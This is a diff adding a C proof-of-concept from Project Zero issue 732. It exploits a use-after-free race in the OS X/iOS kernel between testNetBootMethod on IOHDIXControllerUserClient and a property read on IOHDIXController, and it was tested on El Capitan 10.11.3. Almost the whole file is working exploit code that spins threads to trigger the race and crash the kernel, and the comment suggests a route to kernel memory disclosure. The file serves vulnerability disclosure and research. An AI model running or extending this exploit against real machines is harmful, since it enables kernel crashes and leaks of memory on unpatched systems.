@@ -1,0 +1,133 @@
+/*
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=732
+
+This is perhaps a more interesting UaF than just racing testNetBootMethod calls as there looks to be a path to getting free'd memory disclosed back to userspace.
+
+Although the copyProperty macro used by is_io_registry_entry_get_property_bin takes the entry's properties lock before reading and
+taking a reference on the property the testNetBootMethod external method directly calls the overriden setProperty without
+taking that same lock. ::setProperty calls ::release on all the properties before nulling them out then replacing them
+with new objects - we can get a UAF if we can get that ::release call to happen before the ::retain in copyProperty.
+
+This PoC will crash as a UaF but with more care I believe you could get the OSSerialize to serialize an invalid object
+leading to a nice kernel memory disclosure.
+
+Tested on OS X 10.11.3 El Capitan 15D21 on MacBookAir5,2
+*/
+
+//ianbeer
+
+//build: clang -o hdix_race_get_set hdix_race_get_set.c -framework IOKit -framework Foundation -lpthread
+
+/*
+OS X/iOS kernel UAF racing getProperty on IOHDIXController and testNetBootMethod on IOHDIXControllerUserClient
+
+This is perhaps a more interesting UaF than just racing testNetBootMethod calls as there looks to be a path to getting free'd memory disclosed back to userspace.
+
+Although the copyProperty macro used by is_io_registry_entry_get_property_bin takes the entry's properties lock before reading and
+taking a reference on the property the testNetBootMethod external method directly calls the overriden setProperty without
+taking that same lock. ::setProperty calls ::release on all the properties before nulling them out then replacing them
+with new objects - we can get a UAF if we can get that ::release call to happen before the ::retain in copyProperty.
+
+This PoC will crash as a UaF but with more care I believe you could get the OSSerialize to serialize an invalid object
+leading to a nice kernel memory disclosure.
+
+Tested on OS X 10.11.3 El Capitan 15D21 on MacBookAir5,2
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+#include <IOKit/IOKitLib.h>
+
+#include <libkern/OSAtomic.h>
+
+#include <mach/thread_act.h>
+
+#include <pthread.h>
+
+#include <mach/mach.h>
+#include <mach/vm_map.h>
+#include <sys/mman.h>
+
+#include <CoreFoundation/CoreFoundation.h>
+    
+unsigned int selector = 0;
+
+uint64_t inputScalar[16];
+size_t inputScalarCnt = 0;
+
+uint8_t inputStruct[4096];
+size_t inputStructCnt = 0; 
+
+uint64_t outputScalar[16] = {0};
+uint32_t outputScalarCnt = 0;
+
+char outputStruct[4096] = {0};
+size_t outputStructCnt = 0;
+
+io_connect_t global_conn = MACH_PORT_NULL;
+
+void set_params(io_connect_t conn){
+  char* payload = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
+  global_conn = conn;
+  selector = 4;
+  inputScalarCnt = 0;
+  inputStructCnt = strlen(payload)+1;
+  strcpy((char*)inputStruct, payload);
+  outputScalarCnt = 0;
+  outputStructCnt = 0;  
+}
+
+void make_iokit_call(){  
+  IOConnectCallMethod(
+      global_conn,
+      selector,
+      inputScalar,
+      inputScalarCnt,
+      inputStruct,
+      inputStructCnt,
+      outputScalar,
+      &outputScalarCnt,
+      outputStruct,
+      &outputStructCnt);
+}
+
+OSSpinLock lock = OS_SPINLOCK_INIT;
+
+void* thread_func(void* arg){
+  for(;;) {
+    int got_it = 0;
+    while (!got_it) {
+      got_it = OSSpinLockTry(&lock);
+    }
+
+    make_iokit_call();
+  }
+  return NULL;
+}
+
+int main(int argc, char** argv){
+  kern_return_t err;
+  OSSpinLockLock(&lock);
+
+  pthread_t t;
+  pthread_create(&t, NULL, thread_func, NULL);
+
+  mach_port_t service = IOServiceGetMatchingService(kIOMasterPortDefault,
+                                                    IOServiceMatching("IOHDIXController"));
+
+  mach_port_t conn = MACH_PORT_NULL;
+  IOServiceOpen(service, mach_task_self(), 0, &conn);
+  
+  set_params(conn);
+  for(;;) {
+    OSSpinLockUnlock(&lock);
+    CFTypeRef p = IORegistryEntryCreateCFProperty(service,
+                                                  CFSTR("di-root-image-result"),
+                                                  kCFAllocatorDefault,
+                                                  0);
+  }
+  return 0;
+}
